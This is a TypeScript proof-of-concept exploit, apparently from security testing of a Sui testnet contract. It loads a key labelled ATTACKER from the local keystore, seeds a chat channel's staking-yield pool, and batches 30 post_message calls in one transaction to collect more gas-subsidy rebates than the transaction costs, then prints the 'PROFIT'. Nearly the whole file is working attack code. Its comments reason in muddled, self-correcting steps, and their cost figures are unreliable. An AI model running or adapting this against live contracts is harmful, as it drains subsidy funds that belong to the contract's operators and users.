import { SuiGrpcClient } from "@mysten/sui/grpc"
import { Ed25519Keypair } from "@mysten/sui/keypairs/ed25519"
import { fromBase64 } from "@mysten/sui/utils"
import { Transaction } from "@mysten/sui/transactions"
import { readFileSync } from "node:fs"
import { homedir } from "node:os"

const PKG = "0xcdc87b8ef5b071a293966f4329f1e9b4a443f49f1cf599cc188009cf7524ab44"
const CLOCK = "0x0000000000000000000000000000000000000000000000000000000000000006"
const ATTACKER = "0x843f44a42e10a6dc701b7f60a4dedc544dc7910e971ee6a493f4d9096953e04e"
const client = new SuiGrpcClient({ network: "testnet", baseUrl: "https://fullnode.testnet.sui.io:443" })
const ks = JSON.parse(readFileSync(`${homedir()}/.sui/sui_config/sui.keystore`, "utf8")) as string[]
let att: Ed25519Keypair | undefined
for (const e of ks) { const kp = Ed25519Keypair.fromSecretKey(fromBase64(e).slice(1)); if (kp.toSuiAddress() === ATTACKER) att = kp }
if (!att) throw new Error("no attacker key")
const st = JSON.parse(readFileSync("/tmp/t01-state.json", "utf8"))
const chan2 = st.chan2
type TxEvent = { eventType?: string; type?: string }
interface GasUsed { computationCost: string; storageCost: string; storageRebate: string }
interface TxRecord { digest: string | { digest?: string }; events?: TxEvent[] | { events?: TxEvent[] }; effects?: { gasUsed?: GasUsed } }

// Second burst on a re-seeded pool to measure marginal cost with storage rebate
// (event storage is returned when objects/events cleaned? No—events are not
// rebated; storageCost here includes event bytes). Marginal per-message cost
// from run 1: total net 12.856 MIST for 20 msgs + 1 seed… actually run 1 tx had
// 20 calls: computation 1.0 MIST flat? No: computation 1_000_000 is the whole
// tx. Marginal storage: 14.858M/20 ≈ 0.74 MIST/msg… rebate is 1.0 MIST/msg!
// => profitable if pool seeded by someone else. Re-run burst with fresh seed to
// confirm with cleaner accounting (K=30, seed 0.03).
{
  const t0 = new Transaction()
  const [c] = t0.splitCoins(t0.gas, [t0.pure.u64(30_000_000n)])
  t0.moveCall({ target: `${PKG}::onchain_chat::deposit_staking_yield`, arguments: [t0.object(chan2), c] })
  t0.setGasBudget(20_000_000)
  t0.setSender(att.toSuiAddress())
  const bytes = await t0.build({ client })
  const sig = await att.signTransaction(bytes)
  const res = await client.executeTransaction({ transaction: bytes, signatures: [sig.signature], include: { effects: true } })
  console.log("seed2 ok:", res.Transaction?.status?.success)
}
await new Promise((r) => setTimeout(r, 6000))
{
  const K = 30
  const tx = new Transaction()
  for (let i = 0; i < K; i++) {
    tx.moveCall({
      target: `${PKG}::onchain_chat::post_message`,
      arguments: [tx.object(chan2), tx.object(CLOCK), tx.pure.vector("u8", Buffer.from("b")), tx.pure.vector("u8", Buffer.from("x"))],
    })
  }
  tx.setGasBudget(60_000_000)
  tx.setSender(att.toSuiAddress())
  const bytes = await tx.build({ client })
  const sig = await att.signTransaction(bytes)
  const res: { Transaction?: TxRecord } = await client.executeTransaction({ transaction: bytes, signatures: [sig.signature], include: { effects: true, events: true } })
  const t = res.Transaction!
  const evs = Array.isArray(t?.events) ? t.events : (t?.events?.events ?? [])
  const rebates = evs.filter((e: TxEvent) => String(e.eventType ?? e.type).endsWith("GasSubsidizedEvent")).length
  const g: Partial<GasUsed> = t?.effects?.gasUsed ?? {}
  const net = BigInt(g.computationCost ?? 0) + BigInt(g.storageCost ?? 0) - BigInt(g.storageRebate ?? 0)
  console.log(`K=${K} rebates=${rebates} netGas=${net} MIST; rebates_value=${rebates * 1_000_000}`)
  console.log("PROFIT (MIST):", BigInt(rebates * 1_000_000) - net)
  console.log("digest:", typeof t?.digest === "string" ? t.digest : t?.digest?.digest)
}
